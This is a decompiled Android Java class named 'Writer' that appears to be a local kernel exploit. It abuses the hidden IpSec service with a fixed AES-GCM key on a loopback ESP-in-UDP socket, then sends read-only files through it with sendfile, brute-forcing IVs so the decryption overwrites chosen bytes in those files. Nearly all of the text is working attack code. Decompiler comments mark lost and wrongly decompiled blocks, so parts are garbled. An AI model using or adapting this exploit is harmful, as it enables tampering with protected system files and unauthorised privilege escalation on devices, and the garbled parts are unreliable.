package q3;

import android.os.Binder;
import android.system.Os;
import android.system.OsConstants;
import androidx.compose.ui.graphics.Fields;
import java.io.File;
import java.io.FileDescriptor;
import java.io.RandomAccessFile;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.InetAddress;
import java.nio.file.Files;
import java.util.Arrays;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/* loaded from: assets/fugu/e2e.dex */
public class Writer {
    static Cipher AES = null;
    static Object[] KEEP = null;
    static byte[] KEYMAT = new byte[20];
    static final int MSG_MORE = 32768;
    static Object svc;

    static Class<?> C(String str) throws Exception {
        return Class.forName(str);
    }

    static Object call(String str, Class<?>[] clsArr, Object... objArr) throws Exception {
        try {
            return C("android.net.IIpSecService").getMethod(str, clsArr).invoke(svc, objArr);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(str + " -> " + e.getCause());
        }
    }

    static int fi(Object obj, String str) throws Exception {
        Field declaredField = obj.getClass().getDeclaredField(str);
        declaredField.setAccessible(true);
        return declaredField.getInt(obj);
    }

    static int ks0(byte[] bArr) throws Exception {
        byte[] bArr2 = new byte[16];
        System.arraycopy(KEYMAT, 16, bArr2, 0, 4);
        System.arraycopy(bArr, 0, bArr2, 4, 8);
        bArr2[15] = 2;
        return AES.doFinal(bArr2)[0] & 255;
    }

    public static void main(String[] strArr) {
        try {
            run(strArr);
        } catch (Throwable th) {
            System.out.println("[!] " + th);
            th.printStackTrace(System.out);
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:29:0x02c0, code lost:
    
        r12 = 16;
        r11 = new byte[16];
        r11[0] = (byte) (r8 >>> 24);
        r11[1] = (byte) (r8 >>> 16);
        r11[2] = (byte) (r8 >>> 8);
        r11[3] = (byte) r8;
        r11[7] = 1;
        java.lang.System.arraycopy(r9, 0, r11, 8, 8);
        r4 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:30:0x02e4, code lost:
    
        r27 = r11;
        r28 = r12;
        r18 = r13;
        r29 = r14;
        r15 = r23;
        r23 = r1;
        r1 = r15;
     */
    /* JADX WARN: Code restructure failed: missing block: B:32:0x0306, code lost:
    
        android.system.Os.sendto(r3, r11, 0, 16, 32768, null, 0);
     */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x030d, code lost:
    
        android.system.Os.sendfile(r3, r1, new android.system.Int64Ref(r29), 17);
     */
    /* JADX WARN: Code restructure failed: missing block: B:36:0x0318, code lost:
    
        r31 = r29;
     */
    /* JADX WARN: Code restructure failed: missing block: B:38:0x0324, code lost:
    
        android.system.Os.sendto(r3, new byte[0], 0, 0, 0, null, 0);
     */
    /* JADX WARN: Code restructure failed: missing block: B:41:0x0328, code lost:
    
        r5 = r5 + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:42:0x032c, code lost:
    
        if ((r5 & 63) != 0) goto L77;
     */
    /* JADX WARN: Code restructure failed: missing block: B:43:0x032e, code lost:
    
        java.lang.Thread.sleep(1);
     */
    /* JADX WARN: Code restructure failed: missing block: B:46:0x0340, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:47:0x0349, code lost:
    
        r24 = r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:52:0x0357, code lost:
    
        android.system.Os.sendto(r3, new byte[0], 0, 0, 0, null, 0);
     */
    /* JADX WARN: Code restructure failed: missing block: B:53:0x0360, code lost:
    
        r4 = r4 + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:54:0x0364, code lost:
    
        if (r4 <= 500) goto L48;
     */
    /* JADX WARN: Code restructure failed: missing block: B:55:0x0366, code lost:
    
        java.lang.Thread.sleep(2);
        r13 = r18;
        r11 = r27;
        r12 = r28;
        r14 = r31;
        r23 = r1;
        r1 = r23;
     */
    /* JADX WARN: Code restructure failed: missing block: B:57:0x037b, code lost:
    
        throw r24;
     */
    /* JADX WARN: Code restructure failed: missing block: B:64:0x0342, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:65:0x0343, code lost:
    
        r31 = r29;
     */
    /* JADX WARN: Code restructure failed: missing block: B:67:0x0346, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:68:0x0347, code lost:
    
        r31 = r29;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    static void run(String[] strArr) throws Exception {
        RandomAccessFile randomAccessFile;
        Random random;
        FileDescriptor fileDescriptor;
        int length = strArr.length / 2;
        for (int i = 0; i < 20; i++) {
            KEYMAT[i] = (byte) (i + 65);
        }
        Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");
        AES = cipher;
        cipher.init(1, new SecretKeySpec(Arrays.copyOfRange(KEYMAT, 0, 16), "AES"));
        svc = C("android.net.IIpSecService$Stub").getMethod("asInterface", C("android.os.IBinder")).invoke(null, C("android.os.ServiceManager").getMethod("getService", String.class).invoke(null, "ipsec"));
        Class<?> C = C("android.os.IBinder");
        Binder binder = new Binder();
        Object call = call("openUdpEncapsulationSocket", new Class[]{Integer.TYPE, C}, 0, binder);
        int fi = fi(call, "resourceId");
        int fi2 = fi(call, "port");
        Object call2 = call("allocateSecurityParameterIndex", new Class[]{String.class, Integer.TYPE, C}, "127.0.0.1", Integer.valueOf(new Random().nextInt(65536) | (-559087616)), binder);
        int fi3 = fi(call2, "resourceId");
        int fi4 = fi(call2, "spi");
        Object newInstance = C("android.net.IpSecAlgorithm").getConstructor(String.class, byte[].class, Integer.TYPE).newInstance("rfc4106(gcm(aes))", KEYMAT, Integer.valueOf(Fields.SpotShadowColor));
        Class<?> C2 = C("android.net.IpSecConfig");
        Object newInstance2 = C2.getDeclaredConstructor(new Class[0]).newInstance(new Object[0]);
        C2.getMethod("setMode", Integer.TYPE).invoke(newInstance2, 0);
        C2.getMethod("setSourceAddress", String.class).invoke(newInstance2, "127.0.0.1");
        C2.getMethod("setDestinationAddress", String.class).invoke(newInstance2, "127.0.0.1");
        C2.getMethod("setSpiResourceId", Integer.TYPE).invoke(newInstance2, Integer.valueOf(fi3));
        C2.getMethod("setEncapType", Integer.TYPE).invoke(newInstance2, 2);
        C2.getMethod("setEncapSocketResourceId", Integer.TYPE).invoke(newInstance2, Integer.valueOf(fi));
        C2.getMethod("setEncapRemotePort", Integer.TYPE).invoke(newInstance2, Integer.valueOf(fi2));
        C2.getMethod("setAuthenticatedEncryption", C("android.net.IpSecAlgorithm")).invoke(newInstance2, newInstance);
        Object call3 = call("createTransform", new Class[]{C2, C, String.class}, newInstance2, binder, "com.android.shell");
        KEEP = new Object[]{svc, binder, call, call2, newInstance, newInstance2, call3};
        int i2 = length;
        System.out.println("[*] writer SA status=" + fi(call3, "status") + " spi=0x" + Integer.toHexString(fi4) + " port=" + fi2 + " files=" + i2);
        FileDescriptor socket = Os.socket(OsConstants.AF_INET, OsConstants.SOCK_DGRAM, 0);
        try {
            Os.setsockoptInt(socket, OsConstants.SOL_SOCKET, OsConstants.SO_SNDBUF, 4194304);
        } catch (Throwable th) {
        }
        Os.connect(socket, InetAddress.getByName("127.0.0.1"), fi2);
        Random random2 = new Random(20929L);
        int i3 = 0;
        int i4 = 0;
        int i5 = 0;
        while (i4 < i2) {
            int i6 = i4 * 2;
            String str = strArr[i6];
            byte[] readAllBytes = Files.readAllBytes(new File(strArr[i6 + 1]).toPath());
            int length2 = readAllBytes.length / 5;
            FileDescriptor open = Os.open(str, OsConstants.O_RDONLY, 0);
            RandomAccessFile randomAccessFile2 = new RandomAccessFile(str, "r");
            int i7 = i5;
            int i8 = 0;
            int i9 = i3;
            while (i8 < length2) {
                int i10 = i2;
                FileDescriptor fileDescriptor2 = open;
                int i11 = length2;
                long j = (readAllBytes[r0] & 255) | ((readAllBytes[r0 + 1] & 255) << 8) | ((readAllBytes[r0 + 2] & 255) << 16) | ((255 & readAllBytes[r0 + 3]) << 24);
                int i12 = readAllBytes[(i8 * 5) + 4] & 255;
                randomAccessFile2.seek(j);
                int read = randomAccessFile2.read();
                if (read == i12) {
                    i7++;
                    randomAccessFile = randomAccessFile2;
                    random = random2;
                    fileDescriptor = fileDescriptor2;
                } else {
                    int i13 = (i12 ^ read) & 255;
                    byte[] bArr = new byte[8];
                    int i14 = 0;
                    while (true) {
                        random2.nextBytes(bArr);
                        i14++;
                        if (ks0(bArr) == i13) {
                            break;
                        }
                        RandomAccessFile randomAccessFile3 = randomAccessFile2;
                        long j2 = j;
                        FileDescriptor fileDescriptor3 = fileDescriptor2;
                        Random random3 = random2;
                        if (i14 > 2000000) {
                            throw new RuntimeException("no IV @" + j2);
                        }
                        randomAccessFile2 = randomAccessFile3;
                        j = j2;
                        fileDescriptor2 = fileDescriptor3;
                        random2 = random3;
                    }
                }
                i8++;
                open = fileDescriptor;
                randomAccessFile2 = randomAccessFile;
                length2 = i11;
                i2 = i10;
                random2 = random;
            }
            randomAccessFile2.close();
            Os.close(open);
            i4++;
            i3 = i9;
            i5 = i7;
            random2 = random2;
        }
        System.out.println("[+] wrote=" + i3 + " skipped=" + i5);
    }
}
